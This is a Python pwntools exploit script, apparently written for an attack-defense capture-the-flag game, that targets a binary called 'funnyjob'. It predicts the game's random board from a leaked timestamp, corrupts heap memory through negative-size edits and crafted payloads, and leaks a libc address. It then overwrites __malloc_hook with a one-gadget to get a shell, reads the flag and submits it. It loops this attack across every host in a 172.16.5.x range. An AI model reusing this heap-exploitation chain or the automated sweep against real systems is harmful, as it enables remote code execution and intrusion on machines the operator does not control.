from ctypes import cdll
from pwn import *
import time
from submit import *
# context.log_level="debug"
#context.terminal = ["tmux", "splitw", "-h"]
libc=ELF('./libc.so.6')
#io=process("./funnyjob")
#io=process("./funnyjob")


def ia():
    io.interactive()

def att():
    gdb.attach(io,"c")
    #gdb.attach(io,"source bp")

def sl(data):
    io.sendline(str(data))

def se(data):
    io.send(str(data))

def ru(delim):
    data=io.recvuntil(delim,timeout=1)
    return data

def rl(len):
    data=io.recv(len)
    return data

def new_worker(namesize,name,password,descripsize,descrip,mottosize,motto,age):
    ru("choice:")
    sl(5)
    ru("size:")
    sl(namesize)
    ru("content:")
    sl(name)
    ru("passwd")
    sl(password)
    ru("size:")
    sl(descripsize)
    ru("content:")
    sl(descrip)
    ru("size:")
    sl(mottosize)
    ru("content:")
    sl(motto)
    ru("age:")
    sl(age)

def change_worker(username,password):
    ru("choice:")
    sl("6")
    ru("username:")
    sl(username)
    ru("passwd:")
    sl(password)

def edit_descrip(size,content):
    ru("choice:")
    sl(7)
    ru("choice:")
    sl(2)
    ru("size:")
    sl(size)
    if(size>0):
        sl(content)
    ru("choice:")
    sl(5)

def edit_moto(size,content):
    ru("choice:")
    sl(7)
    ru("choice:")
    sl(3)
    ru("size:")
    sl(size)
    if(size>0):
        sl(content)
    ru("choice:")
    sl(5)
def list_worker():
    ru("choice")
    sl("2")
    ru("2:")
    return ru(" ")[:-1]

def show_moto():
    ru("choice:")
    sl("3")
    ru("choice")
    sl("2")
    ru("motto: ")

    libcaddr=ru("\n")[:-1]
    libcaddr=libcaddr.ljust(8,"\x00")
    print len(libcaddr),libcaddr
    sl(4)

    return u64(libcaddr)
def fakeplaygame():
    ru("choice:")
    sl("1")

def playgame():
    ru("System(")
    dt = ru(')')[:-1]


    timeArray = time.strptime(dt, "%Y/%m/%d %H:%M:%S")

    timestamp = time.mktime(timeArray)

    ru("choice:")
    sl("1")

    libc = cdll.LoadLibrary('/lib/x86_64-linux-gnu/libc.so.6')
    libc.srand(int(timestamp)+2678400+28800)

    m = []
    for i in range(15):
        tmp = []
        for j in range(15):
            if libc.rand() % 8 == 1:
                tmp.append(1)
            else:
                tmp.append(0)
        m.append(tmp)
    print m
    surround_sum = []
    for i in range(15):
        tmp = []
        for j in range(15):
            cnt = 0
            for x in range(i - 1, i + 2):
                for y in range(j - 1, j + 2):
                    if x<0 or x >= 15 or y < 0 or y >= 15:
                        continue
                    if m[x][y] == 1:
                        cnt += 1
            tmp.append(cnt)
        surround_sum.append(tmp)

    for i in range(15):
        for j in range(15):
            if m[i][j] == 0 and surround_sum[i][j] == 0:
                ru('>> ')
                sl('1')
                sl('%d %d' % (i + 1, j + 1))
                arr = ru("\n")[:-1]
                for k in range(0, len(arr), 3):
                    x, y = ord(arr[k]) - ord('A'), ord(arr[k+1]) - ord('a')
                    m[x][y] = 2

    for i in range(15):
        for j in range(15):
            if m[i][j] == 1:
                ru('>> ')
                sl('0')
                sl('%d %d' % (i + 1, j + 1))
            elif m[i][j] == 0:
                ru('>> ')
                sl('1')
                sl('%d %d' % (i + 1, j + 1))
    sl("no")
#att()
def attack(ip=0):
    global io
    if ip==0:
        io=process("./funnyjob")
    else:
        io = remote(ip, 5052)

    playgame()
    #fakeplaygame()
    # ia()
    new_worker("32","a"*6,"1"*8,64,"/bin/sh",32,"a"*4,1)
    new_worker("32","b"*6,"1"*8,88,"b"*4,88,"b"*4,1)
    new_worker("32","c"*6,"1"*8,32,"c"*4,32,"c"*4,1)

    change_worker("b"*6,"1"*8)
    edit_descrip(-1,"")

    change_worker('b'*6,"YWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYfE")
    edit_moto(-1,"")
    change_worker("b"*6,"YWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWEAAAAAAAAAWEpAAAAAAACQ\x11")
    wn=list_worker()
    change_worker(wn,"1"*8)

    change_worker("bbbbbb","AAAAAAAAAABAAAAAAAAAAJhfYAAAAAAA/////wAAAAAAAAAA/////wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x11")
    libcaddr=show_moto()
    print hex(libcaddr)
    system=libcaddr-0x3f160
    change_worker("bbbbbb","AAAAAAAAAABAAAAAAAAAAKiX6Q5KfwAA/////wAAAAAAAAAA/////wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x11")
    #print(hex(system))
    libc.address=system-libc.symbols['system']
    onegadget=libc.address+0x4526a
    print(hex(onegadget))
    new_worker("104","c"*0x10+p64(libc.symbols['__malloc_hook']),"1"*8,32,"c"*4,32,"c"*4,1)
    #raw_input()
    edit_moto(9,p64(onegadget))
    ru("choice:")
    sl(5)
    sl("echo 123;cat flag")
    ru("123\n")
    flag=ru("\n")[:-1]
    print flag
    submit(flag)
#attack()
attack("172.16.5.28")
# raw_input()
while True:
    for ip in range(10,36):
        try:
            attack("172.16.5."+str(ip))
        except:
            continue
    # sleep(60)
#7f4a0eb18390
#7f4a0eb574f0
